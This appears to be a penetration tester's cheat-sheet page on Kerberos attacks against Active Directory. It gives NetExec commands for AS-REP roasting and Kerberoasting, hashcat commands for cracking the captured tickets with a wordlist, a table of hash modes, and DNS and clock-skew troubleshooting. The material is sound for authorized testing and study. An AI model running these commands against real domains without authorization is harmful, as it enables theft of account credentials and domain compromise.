---
title: Kerberos and roasting
order: 2
tags: [ad, kerberos, asrep, kerberoast, hashcat]
---

## AS-REP roasting

Requires known usernames with Kerberos preauthentication disabled. users.txt contains one reviewed candidate per line; the empty password requests unauthenticated checks.

```bash
nxc ldap {{DC}} -d '{{DOMAIN}}' -u users.txt -p '' --asreproast asrep.txt
hashcat -m 18200 asrep.txt /home/kali/tools/wordlists/rockyou.txt
```

Prepare users.txt locally. Mode 18200 applies to etype 23 output only. [Source](https://www.netexec.wiki/ldap-protocol/asreproast).

## Kerberoasting

Requires domain authentication and an eligible account with an SPN.

```bash
nxc ldap {{DC}} -d '{{DOMAIN}}' -u '{{USER}}' -p '{{PASS}}' --kerberoasting tgs.txt
hashcat -m 13100 tgs.txt /home/kali/tools/wordlists/rockyou.txt
```

The cracking command is for etype 23 only. Ordinary roasting requests tickets; targeted roasting that adds an SPN also needs write rights and changes AD. [Source](https://www.netexec.wiki/ldap-protocol/kerberoasting).

## Kerberos hash modes

Choose from the actual output marker, not the attack name. [Hashcat reference](https://github.com/hashcat/hashcat/blob/v8.0.0/docs/hashcat-example-hashes.md).

| Marker | Mode |
| --- | --- |
| $krb5asrep$23$ | 18200 |
| $krb5tgs$23$ | 13100 |
| $krb5tgs$17$ | 19600 |
| $krb5tgs$18$ | 19700 |

TODO: verify the cracker workflow for AES AS-REP output; do not force it into 18200.

## Kerberos DNS or clock failure

- [ ] Use the target's resolvable hostname for Kerberos, not just its IP.
- [ ] Check [DC DNS records](active-directory/ad-enumeration#identify-domain-and-dc); set NetExec's DNS server explicitly when needed.
- [ ] For KRB_AP_ERR_SKEW, compare client and KDC time and check the effective skew policy.

TODO: verify the available time-sync client and local sync procedure.

[Kerberos naming](https://www.netexec.wiki/getting-started/using-kerberos), [DNS options](https://www.netexec.wiki/getting-started/dns-options), [clock prerequisites](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-kile/c427eaf8-72ae-4e4d-aeea-109263de7eee).
